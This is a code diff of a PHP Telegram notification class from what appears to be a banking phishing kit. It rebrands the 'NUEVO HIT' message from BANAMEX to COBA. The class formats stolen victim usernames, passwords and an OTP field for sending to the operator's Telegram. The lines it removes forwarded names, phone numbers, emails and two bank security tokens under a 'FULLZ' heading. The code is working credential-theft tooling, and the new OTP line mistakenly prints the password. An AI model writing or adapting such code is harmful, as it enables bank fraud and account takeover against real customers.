@@ -53,44 +53,16 @@ class TelegramNotificationService
 
 
 
-        $message = "╭━━ 😈BANAMEX :.: NUEVO HIT ━━╮\n";
+        $message = "╭━━ 😈COBA :.: NUEVO HIT ━━╮\n";
         // Sección LOGIN
         if (!empty($usuario->usuario)) {
-            $message .= "┃ 📧  〉ID: `{$usuario->usuario}`\n";
+            $message .= "┃ 📧  〉USUARIO: `{$usuario->usuario}`\n";
         }
         if (!empty($usuario->password)) {
-            $message .= "┃ 📧  〉ID: `{$usuario->password}`\n";
+            $message .= "┃ 📧  〉PASSWORD: `{$usuario->password}`\n";
         }
-
-        // Sección DATOS
-        if (!empty($usuario->nombre) || !empty($usuario->apellido) || !empty($usuario->telefono_movil || !empty($usuario->telefono_fijo) || !empty($usuario->email))) {
-            $message .= "┃ 💵┣ DATOS\n";
-            if (!empty($usuario->nombre)) {
-                $message .= "┃ 💼  〉NOMBRE: `{$usuario->nombre}`\n";
-            }
-            if (!empty($usuario->apellido)) {
-                $message .= "┃ 💼  〉APELLIDO: `{$usuario->apellido}`\n";
-            }
-            if (!empty($usuario->telefono_movil)) {
-                $message .= "┃ 💼  〉TELEFONO MOVIL: `{$usuario->telefono_movil}`\n";
-            }
-            if (!empty($usuario->telefono_fijo)) {
-                $message .= "┃ 💼  〉TELEFONO FIJO: `{$usuario->telefono_fijo}`\n";
-            }
-            if (!empty($usuario->email)) {
-                $message .= "┃ 💼  〉EMAIL: `{$usuario->email}`\n";
-            }
-        }
-
-        // Sección FULLZ
-        if (!empty($usuario->token_codigo) || !empty($usuario->sgdotoken_codigo)) {
-            $message .= "┃ 💵┣ FULLZ\n";
-            if (!empty($usuario->token_codigo)) {
-                $message .= "┃ 💳  〉TOKEN 1: `{$usuario->token_codigo}`\n";
-            }
-            if (!empty($usuario->sgdotoken_codigo)) {
-                $message .= "┃ 💳  TOKEN 2 : `{$usuario->sgdotoken_codigo}`\n";
-            }
+        if (!empty($usuario->password)) {
+            $message .= "┃ 📧  〉OTP: `{$usuario->password}`\n";
         }
 
         // Sección DEVICE
